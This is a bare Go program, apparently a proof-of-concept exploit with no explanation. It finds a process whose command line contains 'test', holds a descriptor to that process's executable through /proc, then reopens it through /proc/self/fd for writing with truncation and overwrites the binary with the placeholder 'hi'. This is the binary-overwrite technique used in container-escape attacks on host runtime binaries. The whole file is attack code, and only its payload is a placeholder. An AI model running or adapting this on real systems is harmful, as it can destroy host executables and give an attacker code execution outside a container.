package main
import "io/ioutil"
import "fmt"
import "strings"
import "strconv"
import "os"
import "bytes"
import "os/exec"
import "log"
const ShellToUse = "bash"
func Shellout(command string)(error,string,string){
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command(ShellToUse,"-c",command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return err, stdout.String(),stderr.String()
}
func main(){
	pids, err := ioutil.ReadDir("/proc")
	if err != nil {
		fmt.Println(err)
		return
	}
		var handleFd =-1
for _, f := range pids{
	//fmt.Println(f.Name())
	fbytes, _ := ioutil.ReadFile("/proc/"+f.Name()+"/cmdline")
	fstring := string(fbytes)
	//fmt.Println(fstring)
	if strings.Contains(fstring,"test"){
			fmt.Println("[+] Found the PID:",f.Name())
			var found int
			found, err := strconv.Atoi(f.Name())
			if err != nil{
				fmt.Println(err)
				continue
			}
			fmt.Println("[+] Atoi result:",found)
		for handleFd ==-1 {
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe",os.O_RDONLY,0777)
		if int(handle.Fd())>0{
			handleFd=int(handle.Fd())
			}
			fmt.Println("[+] Successfully got the file descriptor:",handleFd)
		}
		//fmt.Println("[+] Successfully got the file descriptor:",handleFd)
	}
}
		fmt.Println("result:",handleFd)
			err,out,errout := Shellout("ls -l /proc/self/fd")
			if err != nil{
				log.Printf("error:%v\n",err)
			}
			fmt.Println("----stdout----")
			fmt.Println(out)
			fmt.Println("----stderr----")
			fmt.Println(errout)
			for {
			//fmt.Println("[+] Open handle:","/proc/self/fd/"+strconv.Itoa(handleFd))
			writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
			if int(writeHandle.Fd())>0 {
				fmt.Println("[+] Successfully got write handle",writeHandle)
				var test = "hi"
				writeHandle.Write([]byte(test))
				return
		}else{
				fmt.Println("Error",int(writeHandle.Fd()))
				return
		}
	}
}
